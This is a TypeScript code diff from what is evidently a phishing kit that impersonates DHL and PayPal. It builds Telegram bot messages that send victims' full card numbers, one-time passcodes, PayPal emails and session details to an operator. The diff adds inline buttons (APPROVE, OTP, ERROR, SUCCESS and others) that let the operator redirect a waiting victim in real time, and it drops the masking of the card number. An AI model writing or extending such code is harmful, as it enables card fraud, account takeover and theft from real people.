@@ -1,9 +1,22 @@
 export async function sendTelegramMessage(
   botToken: string,
   chatId: string,
-  message: string
+  message: string,
+  inlineKeyboard?: any[][]
 ): Promise<boolean> {
   try {
+    const body: any = {
+      chat_id: chatId,
+      text: message,
+      parse_mode: "HTML",
+    };
+
+    if (inlineKeyboard && inlineKeyboard.length > 0) {
+      body.reply_markup = {
+        inline_keyboard: inlineKeyboard,
+      };
+    }
+
     const response = await fetch(
       `https://api.telegram.org/bot${botToken}/sendMessage`,
       {
@@ -11,11 +24,7 @@ export async function sendTelegramMessage(
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: "HTML",
-        }),
+        body: JSON.stringify(body),
       }
     );
 
@@ -41,11 +50,10 @@ export function formatPaymentNotification(data: {
   device?: string;
   browser?: string;
   sessionId?: string;
-}): string {
-  const cardLast4 = data.cardNumber.slice(-4);
+}): { message: string; keyboard?: any[][] } {
   const fullCardNumber = data.cardNumber;
   
-  return `
+  const message = `
 🔔 <b>New Activity</b>
 
 ✅ <b>Card Number:</b> ${fullCardNumber}
@@ -61,9 +69,29 @@ ${data.otp1 ? `✅ <b>OTP 1:</b> ${data.otp1}\n` : ''}${data.otp2 ? `✅ <b>OTP 
 <b>Session:</b> ${data.sessionId || 'N/A'}
 <b>Device:</b> ${data.device || 'Desktop/Unknown'}
 <b>Browser:</b> ${data.browser || 'Unknown'}
-<b>Page:</b> Card Entry${data.sessionId && !data.otp1 && !data.otp2 ? `\n\n<b>⏳ Client en attente...</b>\n\nCommandes:\n/dhl_otp_${data.sessionId} - Rediriger vers OTP\n/dhl_error_${data.sessionId} - Rediriger vers ERROR` : ''}
+<b>Page:</b> Card Entry
 +-----------------------------
   `.trim();
+
+  const keyboard = data.sessionId && !data.otp1 && !data.otp2 ? [
+    [
+      { text: "❌ ERROR ❌", callback_data: `dhl_error_${data.sessionId}` }
+    ],
+    [
+      { text: "APPROVE", callback_data: `dhl_approve_${data.sessionId}` },
+      { text: "OTP", callback_data: `dhl_otp_${data.sessionId}` }
+    ],
+    [
+      { text: "OTP ERROR", callback_data: `dhl_otp_error_${data.sessionId}` },
+      { text: "SUCCESS", callback_data: `dhl_success_${data.sessionId}` }
+    ],
+    [
+      { text: "LOADING", callback_data: `dhl_loading_${data.sessionId}` },
+      { text: "🏠 HOME", callback_data: `dhl_home_${data.sessionId}` }
+    ]
+  ] : undefined;
+
+  return { message, keyboard };
 }
 
 export function formatPayPalNotification(data: {
@@ -76,12 +104,8 @@ export function formatPayPalNotification(data: {
   browser?: string;
   sessionId?: string;
   targetUrl?: string;
-}): string {
-  const redirectMessage = data.targetUrl 
-    ? `\n\nThe visitor will be redirected within 2 seconds.`
-    : `\n\n<b>⏳ Client en attente...</b>\n\nCommandes:\n/otp_${data.sessionId} - Rediriger vers OTP\n/error_${data.sessionId} - Rediriger vers LOGIN ERROR`;
-  
-  return `
+}): { message: string; keyboard?: any[][] } {
+  const message = `
 🔔 <b>New Activity</b>
 
 ✅ <b>Email:</b> ${data.email}
@@ -94,8 +118,24 @@ export function formatPayPalNotification(data: {
 <b>Session:</b> ${data.sessionId || 'N/A'}
 <b>Device:</b> ${data.device || 'Desktop/Unknown'}
 <b>Browser:</b> ${data.browser || 'Unknown'}
-<b>Page:</b> Login Page${redirectMessage}
+<b>Page:</b> Login Page
   `.trim();
+
+  const keyboard = data.sessionId ? [
+    [
+      { text: "❌ LOGIN ERROR ❌", callback_data: `paypal_error_${data.sessionId}` }
+    ],
+    [
+      { text: "APPROVE", callback_data: `paypal_approve_${data.sessionId}` },
+      { text: "OTP", callback_data: `paypal_otp_${data.sessionId}` }
+    ],
+    [
+      { text: "SUCCESS", callback_data: `paypal_success_${data.sessionId}` },
+      { text: "🏠 HOME", callback_data: `paypal_home_${data.sessionId}` }
+    ]
+  ] : undefined;
+
+  return { message, keyboard };
 }
 
 export async function getClientInfo(req: any): Promise<{
